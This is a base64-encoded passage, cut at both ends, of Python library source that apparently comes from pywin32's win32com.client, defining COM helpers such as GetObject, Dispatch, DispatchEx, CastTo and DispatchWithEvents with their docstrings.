m8sIGNsc2N0eD1jbHNjdHgpXG5cblxuZGVmIEdldE9iamVjdChQYXRobmFtZT1Ob25lLCBDbGFzcz1Ob25lLCBjbHNjdHg9Tm9uZSk6XG4gICAgIiIiXG4gICAgTWltaWMgVkJcJ3MgR2V0T2JqZWN0KCkgZnVuY3Rpb24uXG5cbiAgICBvYiA9IEdldE9iamVjdChDbGFzcyA9ICJQcm9nSUQiKSBvciBHZXRPYmplY3QoQ2xhc3MgPSBjbHNpZCkgd2lsbFxuICAgIGNvbm5lY3QgdG8gYW4gYWxyZWFkeSBydW5uaW5nIGluc3RhbmNlIG9mIHRoZSBDT00gb2JqZWN0LlxuXG4gICAgb2IgPSBHZXRPYmplY3QociJjOlxcYmxhaFxcYmxhaFxcZm9vLnhscyIpIChha2EgdGhlIENPTSBtb25pa2VyIHN5bnRheClcbiAgICB3aWxsIHJldHVybiBhIHJlYWR5IHRvIHVzZSBQeXRob24gd3JhcHBpbmcgb2YgdGhlIHJlcXVpcmVkIENPTSBvYmplY3QuXG5cbiAgICBOb3RlOiBZb3UgbXVzdCBzcGVjaWZpeSBvbmUgb3IgdGhlIG90aGVyIG9mIHRoZXNlIGFyZ3VtZW50cy4gSSBrbm93XG4gICAgdGhpcyBpc25cJ3QgcHJldHR5LCBidXQgaXQgaXMgd2hhdCBWQiBkb2VzLiBCbGVjaC4gSWYgeW91IGRvblwndFxuICAgIElcJ2xsIHRocm93IFZhbHVlRXJyb3IgYXQgeW91LiA6KVxuXG4gICAgVGhpcyB3aWxsIG1vc3QgbGlrZWx5IHRocm93IHB5dGhvbmNvbS5jb21fZXJyb3IgaWYgYW55dGhpbmcgZmFpbHMuXG4gICAgIiIiXG4gICAgaWYgY2xzY3R4IGlzIE5vbmU6XG4gICAgICAgIGNsc2N0eCA9IHB5dGhvbmNvbS5DTFNDVFhfQUxMXG5cbiAgICBpZiAoUGF0aG5hbWUgaXMgTm9uZSBhbmQgQ2xhc3MgaXMgTm9uZSkgb3IgKFxuICAgICAgICBQYXRobmFtZSBpcyBub3QgTm9uZSBhbmQgQ2xhc3MgaXMgbm90IE5vbmVcbiAgICApOlxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxuICAgICAgICAgICAgIllvdSBtdXN0IHNwZWNpZnkgYSB2YWx1ZSBmb3IgUGF0aG5hbWUgb3IgQ2xhc3MsIGJ1dCBub3QgYm90aC4iXG4gICAgICAgIClcblxuICAgIGlmIENsYXNzIGlzIG5vdCBOb25lOlxuICAgICAgICByZXR1cm4gR2V0QWN0aXZlT2JqZWN0KENsYXNzLCBjbHNjdHgpXG4gICAgZWxzZTpcbiAgICAgICAgcmV0dXJuIE1vbmlrZXIoUGF0aG5hbWUsIGNsc2N0eClcblxuXG5kZWYgR2V0QWN0aXZlT2JqZWN0KENsYXNzLCBjbHNjdHg9cHl0aG9uY29tLkNMU0NUWF9BTEwpOlxuICAgICIiIlxuICAgIFB5dGhvbiBmcmllbmRseSB2ZXJzaW9uIG9mIEdldE9iamVjdFwncyBQcm9nSUQvQ0xTSUQgZnVuY3Rpb25hbGl0eS5cbiAgICAiIiJcbiAgICByZXN1bHRDTFNJRCA9IHB5d2ludHlwZXMuSUlEKENsYXNzKVxuICAgIGRpc3BhdGNoID0gcHl0aG9uY29tLkdldEFjdGl2ZU9iamVjdChyZXN1bHRDTFNJRClcbiAgICBkaXNwYXRjaCA9IGRpc3BhdGNoLlF1ZXJ5SW50ZXJmYWNlKHB5dGhvbmNvbS5JSURfSURpc3BhdGNoKVxuICAgIHJldHVybiBfX1dyYXBEaXNwYXRjaChkaXNwYXRjaCwgQ2xhc3MsIHJlc3VsdENMU0lEPXJlc3VsdENMU0lELCBjbHNjdHg9Y2xzY3R4KVxuXG5cbmRlZiBNb25pa2VyKFBhdGhuYW1lLCBjbHNjdHg9cHl0aG9uY29tLkNMU0NUWF9BTEwpOlxuICAgICIiIlxuICAgIFB5dGhvbiBmcmllbmRseSB2ZXJzaW9uIG9mIEdldE9iamVjdFwncyBtb25pa2VyIGZ1bmN0aW9uYWxpdHkuXG4gICAgIiIiXG4gICAgbW9uaWtlciwgaSwgYmluZEN0eCA9IHB5dGhvbmNvbS5Na1BhcnNlRGlzcGxheU5hbWUoUGF0aG5hbWUpXG4gICAgZGlzcGF0Y2ggPSBtb25pa2VyLkJpbmRUb09iamVjdChiaW5kQ3R4LCBOb25lLCBweXRob25jb20uSUlEX0lEaXNwYXRjaClcbiAgICByZXR1cm4gX19XcmFwRGlzcGF0Y2goZGlzcGF0Y2gsIFBhdGhuYW1lLCBjbHNjdHg9Y2xzY3R4KVxuXG5cbmRlZiBEaXNwYXRjaChcbiAgICBkaXNwYXRjaCxcbiAgICB1c2VyTmFtZT1Ob25lLFxuICAgIHJlc3VsdENMU0lEPU5vbmUsXG4gICAgdHlwZWluZm89Tm9uZSxcbiAgICBVbmljb2RlVG9TdHJpbmc9Tm9uZSxcbiAgICBjbHNjdHg9cHl0aG9uY29tLkNMU0NUWF9TRVJWRVIsXG4pOlxuICAgICIiIkNyZWF0ZXMgYSBEaXNwYXRjaCBiYXNlZCBDT00gb2JqZWN0LiIiIlxuICAgIGFzc2VydCBVbmljb2RlVG9TdHJpbmcgaXMgTm9uZSwgInRoaXMgaXMgZGVwcmVjYXRlZCBhbmQgd2lsbCBnbyBhd2F5IlxuICAgIGRpc3BhdGNoLCB1c2VyTmFtZSA9IGR5bmFtaWMuX0dldEdvb2REaXNwYXRjaEFuZFVzZXJOYW1lKGRpc3BhdGNoLCB1c2VyTmFtZSwgY2xzY3R4KVxuICAgIHJldHVybiBfX1dyYXBEaXNwYXRjaChkaXNwYXRjaCwgdXNlck5hbWUsIHJlc3VsdENMU0lELCB0eXBlaW5mbywgY2xzY3R4PWNsc2N0eClcblxuXG5kZWYgRGlzcGF0Y2hFeChcbiAgICBjbHNpZCxcbiAgICBtYWNoaW5lPU5vbmUsXG4gICAgdXNlck5hbWU9Tm9uZSxcbiAgICByZXN1bHRDTFNJRD1Ob25lLFxuICAgIHR5cGVpbmZvPU5vbmUsXG4gICAgVW5pY29kZVRvU3RyaW5nPU5vbmUsXG4gICAgY2xzY3R4PU5vbmUsXG4pOlxuICAgICIiIkNyZWF0ZXMgYSBEaXNwYXRjaCBiYXNlZCBDT00gb2JqZWN0IG9uIGEgc3BlY2lmaWMgbWFjaGluZS4iIiJcbiAgICBhc3NlcnQgVW5pY29kZVRvU3RyaW5nIGlzIE5vbmUsICJ0aGlzIGlzIGRlcHJlY2F0ZWQgYW5kIHdpbGwgZ28gYXdheSJcbiAgICAjIElmIEluUHJvYyBpcyByZWdpc3RlcmVkLCBEQ09NIHdpbGwgdXNlIGl0IHJlZ2FyZGxlc3Mgb2YgdGhlIG1hY2hpbmUgbmFtZVxuICAgICMgKGFuZCByZWdhcmRsZXNzIG9mIHRoZSBEQ09NIGNvbmZpZyBmb3IgdGhlIG9iamVjdC4pICBTbyB1bmxlc3MgdGhlIHVzZXJcbiAgICAjIHNwZWNpZmllcyBvdGhlcndpc2UsIHdlIGV4Y2x1ZGUgaW5wcm9jIGFwcHMgd2hlbiBhIHJlbW90ZSBtYWNoaW5lIGlzIHVzZWQuXG4gICAgaWYgY2xzY3R4IGlzIE5vbmU6XG4gICAgICAgIGNsc2N0eCA9IHB5dGhvbmNvbS5DTFNDVFhfU0VSVkVSXG4gICAgICAgIGlmIG1hY2hpbmUgaXMgbm90IE5vbmU6XG4gICAgICAgICAgICBjbHNjdHggPSBjbHNjdHggJiB+cHl0aG9uY29tLkNMU0NUWF9JTlBST0NcbiAgICBpZiBtYWNoaW5lIGlzIE5vbmU6XG4gICAgICAgIHNlcnZlckluZm8gPSBOb25lXG4gICAgZWxzZTpcbiAgICAgICAgc2VydmVySW5mbyA9IChtYWNoaW5lLClcbiAgICBpZiB1c2VyTmFtZSBpcyBOb25lOlxuICAgICAgICB1c2VyTmFtZSA9IGNsc2lkXG4gICAgZGlzcGF0Y2ggPSBweXRob25jb20uQ29DcmVhdGVJbnN0YW5jZUV4KFxuICAgICAgICBjbHNpZCwgTm9uZSwgY2xzY3R4LCBzZXJ2ZXJJbmZvLCAocHl0aG9uY29tLklJRF9JRGlzcGF0Y2gsKVxuICAgIClbMF1cbiAgICByZXR1cm4gRGlzcGF0Y2goZGlzcGF0Y2gsIHVzZXJOYW1lLCByZXN1bHRDTFNJRCwgdHlwZWluZm8sIGNsc2N0eD1jbHNjdHgpXG5cblxuY2xhc3MgQ0Rpc3BhdGNoKGR5bmFtaWMuQ0Rpc3BhdGNoKTpcbiAgICAiIiJcbiAgICBUaGUgZHluYW1pYyBjbGFzcyB1c2VkIGFzIGEgbGFzdCByZXNvcnQuXG4gICAgVGhlIHB1cnBvc2Ugb2YgdGhpcyBvdmVycmlkaW5nIG9mIGR5bmFtaWMuQ0Rpc3BhdGNoIGlzIHRvIHBlcnBldHVhdGUgdGhlIHBvbGljeVxuICAgIG9mIHVzaW5nIHRoZSBtYWtlcHkgZ2VuZXJhdGVkIHdyYXBwZXIgUHl0aG9uIGNsYXNzIGluc3RlYWQgb2YgZHluYW1pYy5DRGlzcGF0Y2hcbiAgICBpZi93aGVuIHBvc3NpYmxlLlxuICAgICIiIlxuXG4gICAgZGVmIF93cmFwX2Rpc3BhdGNoXyhcbiAgICAgICAgc2VsZiwgb2IsIHVzZXJOYW1lPU5vbmUsIHJldHVybkNMU0lEPU5vbmUsIFVuaWNvZGVUb1N0cmluZz1Ob25lXG4gICAgKTpcbiAgICAgICAgYXNzZXJ0IFVuaWNvZGVUb1N0cmluZyBpcyBOb25lLCAidGhpcyBpcyBkZXByZWNhdGVkIGFuZCB3aWxsIGdvIGF3YXkiXG4gICAgICAgIHJldHVybiBEaXNwYXRjaChvYiwgdXNlck5hbWUsIHJldHVybkNMU0lELCBOb25lKVxuXG4gICAgZGVmIF9fZGlyX18oc2VsZik6XG4gICAgICAgIHJldHVybiBkeW5hbWljLkNEaXNwYXRjaC5fX2Rpcl9fKHNlbGYpXG5cblxuZGVmIENhc3RUbyhvYiwgdGFyZ2V0LCB0eXBlbGliPU5vbmUpOlxuICAgICIiIlwnQ2FzdFwnIGEgQ09NIG9iamVjdCB0byBhbm90aGVyIGludGVyZmFjZSIiIlxuICAgICMgdG9kbyAtIHNob3VsZCBzdXBwb3J0IHRhcmdldCBiZWluZyBhbiBJSURcbiAgICBtb2QgPSBOb25lXG4gICAgaWYgKFxuICAgICAgICB0eXBlbGliIGlzIG5vdCBOb25lXG4gICAgKTogICMgY2FsbGVyIHNwZWNpZmllZCB0YXJnZXQgdHlwZWxpYiAoVHlwZWxpYlNwZWMpLiBTZWUgZS5nLiBzZWxlY3R0bGIuRW51bVRsYnMoKS5cbiAgICAgICAgbW9kID0gZ2VuY2FjaGUuTWFrZU1vZHVsZUZvclR5cGVsaWIoXG4gICAgICAgICAgICB0eXBlbGliLmNsc2lkLCB0eXBlbGliLmxjaWQsIGludCh0eXBlbGliLm1ham9yLCAxNiksIGludCh0eXBlbGliLm1pbm9yLCAxNilcbiAgICAgICAgKVxuICAgICAgICBpZiBub3QgaGFzYXR0cihtb2QsIHRhcmdldCk6XG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxuICAgICAgICAgICAgICAgICJUaGUgaW50ZXJmYWNlIG5hbWUgXCclc1wnIGRvZXMgbm90IGFwcGVhciBpbiB0aGUgIlxuICAgICAgICAgICAgICAgICJzcGVjaWZpZWQgbGlicmFyeSAlciIgJSAodGFyZ2V0LCB0eXBlbGliLnZlcl9kZXNjKVxuICAgICAgICAgICAgKVxuXG4gICAgZWxpZiBoYXNhdHRyKHRhcmdldCwgImluZGV4Iik6ICAjIHN0cmluZyBsaWtlXG4gICAgICAgICMgZm9yIG5vdywgd2UgYXNzdW1lIG1ha2VweSBmb3IgdGhpcyB0byB3b3JrLlxuICAgICAgICBpZiAiQ0xTSUQiIG5vdCBpbiBvYi5fX2NsYXNzX18uX19kaWN0X186XG4gICAgICAgICAgICAjIEVlZWsgLSBubyBtYWtlcHkgc3VwcG9ydCAtIHRyeSBhbmQgYnVpbGQgaXQuXG4gICAgICAgICAgICBvYiA9IGdlbmNhY2hlLkVuc3VyZURpc3BhdGNoKG9iKVxuICAgICAgICBpZiAiQ0xTSUQiIG5vdCBpbiBvYi5fX2NsYXNzX18uX19kaWN0X186XG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJNdXN0IGJlIGEgbWFrZXB5LWFibGUgb2JqZWN0IGZvciB0aGlzIHRvIHdvcmsiKVxuICAgICAgICBjbHNpZCA9IG9iLkNMU0lEXG4gICAgICAgICMgTG90cyBvZiBob29wcyB0byBzdXBwb3J0ICJkZW1hbmQtYnVpbGQiIC0gaWUsIGdlbmVyYXRpbmdcbiAgICAgICAgIyBjb2RlIGZvciBhbiBpbnRlcmZhY2UgZmlyc3QgdGltZSBpdCBpcyB1c2VkLiAgV2UgYXNzdW1lIHRoZVxuICAgICAgICAjIGludGVyZmFjZSBuYW1lIGV4aXN0cyBpbiB0aGUgc2FtZSBsaWJyYXJ5IGFzIHRoZSBvYmplY3QuXG4gICAgICAgICMgVGhpcyBpcyBnZW5lcmFsbHkgdGhlIGNhc2UgLSBvbmx5IHJlZmVyZW5jZWQgdHlwZWxpYnMgbWF5IGJlXG4gICAgICAgICMgYSBwcm9ibGVtLCBhbmQgd2UgY2FuIGhhbmRsZSB0aGF0IGxhdGVyLiAgTWF5YmUgPHdpbms+XG4gICAgICAgICMgU28gZ2V0IHRoZSBnZW5lcmF0ZWQgbW9kdWxlIGZvciB0aGUgbGlicmFyeSBpdHNlbGYsIHRoZW5cbiAgICAgICAgIyBmaW5kIHRoZSBpbnRlcmZhY2UgQ0xTSUQgdGhlcmUuXG4gICAgICAgIG1vZCA9IGdlbmNhY2hlLkdldE1vZHVsZUZvckNMU0lEKGNsc2lkKVxuICAgICAgICAjIEdldCB0aGUgXCdyb290XCcgbW9kdWxlLlxuICAgICAgICBtb2QgPSBnZW5jYWNoZS5HZXRNb2R1bGVGb3JUeXBlbGliKFxuICAgICAgICAgICAgbW9kLkNMU0lELCBtb2QuTENJRCwgbW9kLk1ham9yVmVyc2lvbiwgbW9kLk1pbm9yVmVyc2lvblxuICAgICAgICApXG4gICAgICAgICMgRmluZCB0aGUgQ0xTSUQgb2YgdGhlIHRhcmdldFxuICAgICAgICB0YXJnZXRfY2xzaWQgPSBtb2QuTmFtZXNUb0lJRE1hcC5nZXQodGFyZ2V0KVxuICAgICAgICBpZiB0YXJnZXRfY2xzaWQgaXMgTm9uZTpcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXG4gICAgICAgICAgICAgICAgIlRoZSBpbnRlcmZhY2UgbmFtZSBcJyVzXCcgZG9lcyBub3QgYXBwZWFyIGluIHRoZSAiXG4gICAgICAgICAgICAgICAgInNhbWUgbGlicmFyeSBhcyBvYmplY3QgXCclclwnIiAlICh0YXJnZXQsIG9iKVxuICAgICAgICAgICAgKVxuICAgICAgICBtb2QgPSBnZW5jYWNoZS5HZXRNb2R1bGVGb3JDTFNJRCh0YXJnZXRfY2xzaWQpXG4gICAgaWYgbW9kIGlzIG5vdCBOb25lOlxuICAgICAgICB0YXJnZXRfY2xhc3MgPSBnZXRhdHRyKG1vZCwgdGFyZ2V0KVxuICAgICAgICAjIHJlc29sdmUgY29jbGFzcyB0byBpbnRlcmZhY2VcbiAgICAgICAgdGFyZ2V0X2NsYXNzID0gZ2V0YXR0cih0YXJnZXRfY2xhc3MsICJkZWZhdWx0X2ludGVyZmFjZSIsIHRhcmdldF9jbGFzcylcbiAgICAgICAgcmV0dXJuIHRhcmdldF9jbGFzcyhvYikgICMgYXV0byBRSSBtYWdpYyBoYXBwZW5zXG4gICAgcmFpc2UgVmFsdWVFcnJvclxuXG5cbmNsYXNzIENvbnN0YW50czpcbiAgICAiIiJBIGNvbnRhaW5lciBmb3IgZ2VuZXJhdGVkIENPTSBjb25zdGFudHMuIiIiXG5cbiAgICBkZWYgX19pbml0X18oc2VsZik6XG4gICAgICAgIHNlbGYuX19kaWN0c19fID0gW10gICMgQSBsaXN0IG9mIGRpY3Rpb25hcmllc1xuXG4gICAgZGVmIF9fZ2V0YXR0cl9fKHNlbGYsIGEpOlxuICAgICAgICBmb3IgZCBpbiBzZWxmLl9fZGljdHNfXzpcbiAgICAgICAgICAgIGlmIGEgaW4gZDpcbiAgICAgICAgICAgICAgICByZXR1cm4gZFthXVxuICAgICAgICByYWlzZSBBdHRyaWJ1dGVFcnJvcihhKVxuXG5cbiMgQW5kIGNyZWF0ZSBhbiBpbnN0YW5jZS5cbmNvbnN0YW50cyA9IENvbnN0YW50cygpXG5cbiMgQSBoZWxwZXJzIGZvciBEaXNwYXRjaFdpdGhFdmVudHMgLSB0aGlzIGJlY29tZXMgX19zZXRhdHRyX18gZm9yIHRoZVxuIyB0ZW1wb3JhcnkgY2xhc3MuXG5kZWYgX2V2ZW50X3NldGF0dHJfKHNlbGYsIGF0dHIsIHZhbCk6XG4gICAgdHJ5OlxuICAgICAgICAjIERvZXMgdGhlIENPTSBvYmplY3QgaGF2ZSBhbiBhdHRyaWJ1dGUgb2YgdGhpcyBuYW1lP1xuICAgICAgICBzZWxmLl9fY2xhc3NfXy5fX2Jhc2VzX19bMF0uX19zZXRhdHRyX18oc2VsZiwgYXR0ciwgdmFsKVxuICAgIGV4Y2VwdCBBdHRyaWJ1dGVFcnJvcjpcbiAgICAgICAgIyBPdGhlcndpc2UganVzdCBzdGFzaCBpdCBhd2F5IGluIHRoZSBpbnN0YW5jZS5cbiAgICAgICAgc2VsZi5fX2RpY3RfX1thdHRyXSA9IHZhbFxuXG5cbiMgQW4gaW5zdGFuY2Ugb2YgdGhpcyAicHJveHkiIGlzIGNyZWF0ZWQgdG8gYnJlYWsgdGhlIENPTSBjaXJjdWxhciByZWZlcmVuY2VzXG4jIHRoYXQgZXhpc3QgKGllLCB3aGVuIHdlIGNvbm5lY3QgdG8gdGhlIENPTSBldmVudHMsIENPTSBrZWVwcyBhIHJlZmVyZW5jZVxuIyB0byB0aGUgb2JqZWN0LiAgVGh1cywgdGhlIEV2ZW50IGNvbm5lY3Rpb24gbXVzdCBiZSBtYW51YWxseSBicm9rZW4gYmVmb3JlXG4jIG91ciBvYmplY3QgY2FuIGRpZS4gIFRoaXMgc29sdmVzIHRoZSBwcm9ibGVtIGJ5IG1hbnVhbGx5IGJyZWFraW5nIHRoZSBjb25uZWN0aW9uXG4jIHRvIHRoZSByZWFsIG9iamVjdCBhcyB0aGUgcHJveHkgZGllcy5cbmNsYXNzIEV2ZW50c1Byb3h5OlxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBvYik6XG4gICAgICAgIHNlbGYuX19kaWN0X19bIl9vYmpfIl0gPSBvYlxuXG4gICAgZGVmIF9fZGVsX18oc2VsZik6XG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgICMgSWYgdGhlcmUgaXMgYSBDT00gZXJyb3Igb24gZGlzY29ubmVjdGlvbiB3ZSBzaG91bGRcbiAgICAgICAgICAgICMganVzdCBpZ25vcmUgaXQgLSBvYmplY3QgcHJvYmFibHkgYWxyZWFkeSBzaHV0IGRvd24uLi5cbiAgICAgICAgICAgIHNlbGYuX29ial8uY2xvc2UoKVxuICAgICAgICBleGNlcHQgcHl0aG9uY29tLmNvbV9lcnJvcjpcbiAgICAgICAgICAgIHBhc3NcblxuICAgIGRlZiBfX2dldGF0dHJfXyhzZWxmLCBhdHRyKTpcbiAgICAgICAgcmV0dXJuIGdldGF0dHIoc2VsZi5fb2JqXywgYXR0cilcblxuICAgIGRlZiBfX3NldGF0dHJfXyhzZWxmLCBhdHRyLCB2YWwpOlxuICAgICAgICBzZXRhdHRyKHNlbGYuX29ial8sIGF0dHIsIHZhbClcblxuXG5kZWYgRGlzcGF0Y2hXaXRoRXZlbnRzKGNsc2lkLCB1c2VyX2V2ZW50X2NsYXNzKTpcbiAgICAiIiJDcmVhdGUgYSBDT00gb2JqZWN0IHRoYXQgY2FuIGZpcmUgZXZlbnRzIHRvIGEgdXNlciBkZWZpbmVkIGNsYXNzLlxuICAgIGNsc2lkIC0tIFRoZSBQcm9nSUQgb3IgQ0xTSUQgb2YgdGhlIG9iamVjdCB0byBjcmVhdGUuXG4gICAgdXNlcl9ldmVudF9jbGFzcyAtLSBBIFB5dGhvbiBjbGFzcyBvYmplY3QgdGhhdCByZXNwb25kcyB0byB0aGUgZXZlbnRzLlxuXG4gICAgVGhpcyByZXF1aXJlcyBtYWtlcHkgc3VwcG9ydCBmb3IgdGhlIENPTSBvYmplY3QgYmVpbmcgY3JlYXRlZC4gIElmXG4gICAgdGhpcyBzdXBwb3J0IGRvZXMgbm90IGV4aXN0IGl0IHdpbGwgYmUgYXV0b21hdGljYWxseSBnZW5lcmF0ZWQgYnlcbiAgICB0aGlzIGZ1bmN0aW9uLiAgSWYgdGhlIG9iamVjdCBkb2VzIG5vdCBzdXBwb3J0IG1ha2VweSwgYSBUeXBlRXJyb3JcbiAgICBleGNlcHRpb24gd2lsbCBiZSByYWlzZWQuXG5cbiAgICBUaGUgcmVzdWx0IGlzIGEgY2xhc3MgaW5zdGFuY2UgdGhhdCBib3RoIHJlcHJlc2VudHMgdGhlIENPTSBvYmplY3RcbiAgICBhbmQgaGFuZGxlcyBldmVudHMgZnJvbSB0aGUgQ09NIG9iamVjdC5cblxuICAgIEl0IGlzIGltcG9ydGFudCB0byBub3RlIHRoYXQgdGhlIHJldHVybmVkIGluc3RhbmNlIGlzIG5vdCBhIGRpcmVjdFxuICAgIGluc3RhbmNlIG9mIHRoZSB1c2VyX2V2ZW50X2NsYXNzLCBidXQgYW4gaW5zdGFuY2Ugb2YgYSB0ZW1wb3JhcnlcbiAgICBjbGFzcyBvYmplY3QgdGhhdCBkZXJpdmVzIGZyb20gdGhyZWUgY2xhc3NlczpcbiAgICAqIFRoZSBtYWtlcHkgZ2VuZXJhdGVkIGNsYXNzIGZvciB0aGUgQ09NIG9iamVjdFxuICAgICogVGhlIG1ha2VweSBnZW5lcmF0ZWQgY2xhc3MgZm9yIHRoZSBDT00gZXZlbnRzXG4gICAgKiBUaGUgdXNlcl9ldmVudF9jbGFzcyBhcyBwYXNzZWQgdG8gdGhpcyBmdW5jdGlvbi5cblxuICAgIElmIHRoaXMgaXMgbm90IHN1aXRhYmxlLCBzZWUgdGhlIGdldGV2ZW50cyBmdW5jdGlvbiBmb3IgYW4gYWx0ZXJuYXRpdmVcbiAgICB0ZWNobmlxdWUgb2YgaGFuZGxpbmcgZXZlbnRzLlxuXG4gICAgT2JqZWN0IExpZmV0aW1lczogIFdoZW5ldmVyIHRoZSBvYmplY3QgcmV0dXJuZWQgZnJvbSB0aGlzIGZ1bmN0aW9uIGlzXG4gICAgY2xlYW5lZC11cCBieSBQeXRob24sIHRoZSBldmVudHMgd2lsbCBiZSBkaXNjb25uZWN0ZWQgZnJvbVxuICAgIHRoZSBDT00gb2JqZWN0LiAgVGhpcyBpcyBhbG1vc3QgYWx3YXlzIHdoYXQgc2hvdWxkIGhhcHBlbixcbiAgICBidXQgc2VlIHRoZSBkb2N1bWVudGF0aW9uIGZvciBnZXRldmVudHMoKSBmb3IgbW9yZSBkZXRhaWxzLlxuXG4gICAgRXhhbXBsZTpcblxuICAgID4+PiBjbGFzcyBJRUV2ZW50czpcbiAgICAuLi4gICAgZGVmIE9uVmlzaWJsZShzZWxmLCB2aXNpYmxlKTpcbiAgICAuLi4gICAgICAgcHJpbnQgIlZpc2libGUgY2hhbmdlZDoiLCB2aXNpYmxlXG4gICAgLi4uXG4gICAgPj4+IGllID0gRGlzcGF0Y2hXaXRoRXZlbnRzKCJJbnRlcm5ldEV4cGxvcmVyLkFwcGxpY2F0aW9uIiwgSUVFdmVudHMpXG4gICAgPj4+IGllLlZpc2libGUgPSAxXG4gICAgVmlzaWJsZSBjaGFuZ2VkOiAxXG4gICAgPj4+XG4gICAgIiIiXG4gICAgIyBDcmVhdGUvR2V0IHRoZSBvYmplY3QuXG4gICAgZGlzcCA9IERpc3BhdGNoKGNsc2lkKVxuICAgIGlmIG5vdCBkaXNwLl9fY2xhc3NfXy5fX2RpY3RfXy5nZXQoXG4gICAgICAgICJDTFNJRCJcbiAgICApOiAgIyBFZWVrIC0gbm8gbWFrZXB5IHN1cHBvcnQgLSB0cnkgYW5kIGJ1aWxkIGl0LlxuICAgICAgICB0cnk6XG4gICAgICAgICAgICB0aSA9IGRpc3AuX29sZW9ial8uR2V0VHlwZUluZm8oKVxuICAgICAgICAgICAgZGlzcF9jbHNpZCA9IHRpLkdldFR5cGVBdHRyKClbMF1cbiAgICAgICAgICAgIHRsYiwgaW5kZXggPSB0aS5HZXRDb250YWluaW5nVHlwZUxpYigpXG4gICAgICAgICAgICB0bGEgPSB0bGIuR2V0TGliQXR0cigpXG4gICAgICAgICAgICBnZW5jYWNoZS5FbnN1cmVNb2R1bGUodGxhWzBdLCB0bGFbMV0sIHRsYVszXSwgdGxhWzRdLCBiVmFsaWRhdGVGaWxlPTApXG4gICAgICAgICAgICAjIEdldCB0aGUgY2xhc3MgZnJvbSB0aGUgbW9kdWxlLlxuICAgICAgICAgICAgZGlzcF9jbGFzcyA9IGdlbmNhY2hlLkdldENsYXNzRm9yUHJvZ0lEKHN0cihkaXNwX2Nsc2lkKSlcbiAgICAgICAgZXhjZXB0IHB5dGhvbmNvbS5jb21fZXJyb3I6XG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXG4gICAgICAgICAgICAgICAgIlRoaXMgQ09NIG9iamVjdCBjYW4gbm90IGF1dG9tYXRlIHRoZSBtYWtlcHkgcHJvY2VzcyAtIHBsZWFzZSBydW4gbWFrZXB5IG1hbnVhbGx5IGZvciB0aGlzIG9iamVjdCJcbiAgICAgICAgICAgIClcbiAgICBlbHNlOlxuICAgICAgICBkaXNwX2NsYXNzID0gZGlzcC5fX2NsYXNzX19cbiAgICAjIElmIHRoZSBjbHNpZCB3YXMgYW4gb2JqZWN0LCBnZXQgdGhlIGNsc2lkXG4gICAgY2xzaWQgPSBkaXNwX2NsYXNzLkNMU0lEXG4gICAgIyBDcmVhdGUgYSBuZXcgY2xhc3MgdGhhdCBkZXJpdmVzIGZyb20gMyBjbGFzc2VzIC0gdGhlIGRpc3BhdGNoIGNsYXNzLCB0aGUgZXZlbnQgc2luayBjbGFzcyBhbmQgdGhlIHVzZXIgY2xhc3MuXG4gICAgIyBYWFggLSB3ZSBhcmUgc3RpbGwgImNsYXNzaWMgc3R5bGUiIGNsYXNzZXMgaW4gcHkyeCwgc28gd2UgbmVlZCBjYW5cJ3QgeWV0XG4gICAgIyB1c2UgXCd0eXBlKClcJyBldmVyeXdoZXJlIC0gcmV2aXNpdCBzb29uLCBhcyBweTJ4IHdpbGwgbW92ZSB0byBuZXctc3R5bGUgdG9vLi4uXG4gICAgdHJ5OlxuICAgICAgICBmcm9tIHR5cGVzIGltcG9ydCBDbGFzc1R5cGUgYXMgbmV3X3R5cGVcbiAgICBleGNlcHQgSW1wb3J0RXJyb3I6XG4gICAgICAgIG5ld190eXBlID0gdHlwZSAgIyBweTNrXG4gICAgZXZlbnRzX2NsYXNzID0gZ2V0ZXZlbnRzKGNsc2lkKVxuICAgIGlmIGV2ZW50c19jbGFzcyBpcyBOb25lOlxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJUaGlzIENPTSBvYmplY3QgZG9lcyBub3Qgc3VwcG9ydCBldmVudHMuIilcbiAgICByZXN1bHRfY2xhc3MgPSBuZXdfdHlwZShcbiAgICAgICAgIkNPTUV2ZW50Q2xhc3MiLFxuICAgICAgICAoZGlzcF9jbGFzcywgZXZlbnRzX2NsYXNzLCB1c2VyX2V2ZW50X2NsYXNzKSxcbiAgICAgICAgeyJfX3NldGF0dHJfXyI6IF9ldmVudF9zZXRhdHRyX30sXG4gICAgKVxuICAgIGluc3RhbmNlID0gcmVzdWx0X2NsYXNzKFxuICAgICAgICBkaXNwLl9vbGVvYmpfXG4gICAgKSAgIyBUaGlzIG9ubHkgY2FsbHMgdGhlIGZpcnN0IGJhc2UgY2xhc3MgX19pbml0X18uXG4gICAgZXZlbnRzX2NsYXNzLl9faW5pdF9fKGluc3RhbmNlLCBpbnN0YW5jZSlcbiAgICBpZiBoYXNhdHRyKHVzZXJfZXZlbnRfY2xhc3MsICJfX2luaXRfXyIpOlxuICAgICAgICB1c2VyX2V2ZW50X2NsYXNzLl9faW5pdF9fKGluc3RhbmNlKVxuICAgIHJldHVybiBFdmVudHNQcm94eShpbnN0YW5jZSlcblxuXG5kZWYgV2l0aEV2ZW50cyhkaXNwLCB1c2VyX2V2ZW50X2NsYXNzKTpcbiAgICAiIiJTaW1pbGFyIHRvIERpc3BhdGNoV2l0aEV2ZW50cyAtIGV4Y2VwdCB0aGF0IHRoZSByZXR1cm5lZFxuICAgIG9iamVjdCBpcyAqbm90KiBhbHNvIHVzYWJsZSBhcyB0aGUgb3JpZ2luYWwgRGlzcGF0Y2ggb2JqZWN0IC0gdGhhdCBpc1xuICAgIHRoZSByZXR1cm5lZCBvYmplY3QgaXMgbm90IGRpc3BhdGNoYWJsZS5cblxuICAgIFRoZSBkaWZmZXJlbmNlIGlzIGJlc3Qgc3VtbWFyaXNlZCBieSBleGFtcGxlLlxuXG4gICAgPj4+IGNsYXNzIElFRXZlbnRzOlxuICAgIC4uLiAgICBkZWYgT25WaXNpYmxlKHNlbGYsIHZpc2libGUpOlxuICAgIC4uLiAgICAgICBwcmludCAiVmlzaWJsZSBjaGFuZ2VkOiIsIHZpc2libGVcbiAgICAuLi5cbiAgICA+Pj4gaWUgPSBEaXNwYXRjaCgiSW50ZXJ